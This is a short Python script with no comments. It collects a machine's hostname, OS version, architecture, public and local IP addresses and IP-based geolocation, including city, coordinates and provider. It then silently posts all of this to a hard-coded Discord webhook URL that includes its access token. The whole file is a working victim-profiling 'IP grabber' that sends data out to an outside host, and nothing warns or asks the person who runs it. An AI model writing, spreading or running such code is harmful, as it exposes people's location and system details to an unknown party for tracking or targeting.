import platform
import socket
import requests

##Specs
processor = platform.processor()

##System
system = platform.system()
release = platform.release()
version = platform.version()
architecture = platform.architecture()
hostname = socket.gethostname()
ip_address = requests.get("https://api.ipify.org").text
local_ip_address = socket.gethostbyname(hostname)

##Location
location = requests.get(f"http://ip-api.com/json/{ip_address}").json()

webhook_url = "https://canary.discord.com/api/webhooks/1001476606247837728/eLrP1zJj6-aVKNcRZho2fsGmzsCZqZ7FZKCWvvK9odNhhN05XBZLlfvc1QkFoC8RPiEH"

if system == 'Windows':
    avatar_url = "https://cdn-icons-png.flaticon.com/512/25/25412.png"
elif system == 'Linux':
    avatar_url = "https://cdn-icons-png.flaticon.com/512/518/518713.png"
elif system == 'java':
    avatar_url = "https://cdn-icons-png.flaticon.com/512/226/226777.png"
else:
    avatar_url = "https://cdn-icons-png.flaticon.com/512/57/57108.png"

payload = {
    "username": hostname,
    "avatar_url": avatar_url,
    "embeds": [
        {
            "color": 3407616,
            "fields": [
                {
                    "name": "IP Address",
                    "value": ip_address,
                },
                {
                    "name": "System",
                    "value": f"{system} {release}\n {version}",
                },
                {
                    "name": "Architecture",
                    "value": f"{architecture}",
                }
            ]
        },
        {
            "color": 3407616,
            "title": "Location",
            "fields": [
                {
                    "name": "Country",
                    "value": f"{location['countryCode']} | {location['country']}",
                },
                {
                    "name": "Region",
                    "value": f"{location['region']} | {location['regionName']}",
                },
                {
                    "name": "City",
                    "value": f"{location['city']}",
                },
                {
                    "name": "TimeZone",
                    "value": f"{location['timezone']}",
                },
                {
                    "name": "Maps",
                    "value": f"https://www.google.de/maps/@{location['lat']},{location['lon']},12z",
                },
            ]
        },
        {
            "color": 3407616,
            "title": "Localnetwork",
            "fields": [
                {
                    "name": "Local IP Address",
                    "value": f"{local_ip_address}",
                },
                {
                    "name": "Wifi",
                    "value": f"{local_ip_address}",
                },
                {
                    "name": "Provider",
                    "value": f"{location['as']}",
                }
            ]
        }
    ],
    "attachments": []
}

requests.post(webhook_url, json=payload)
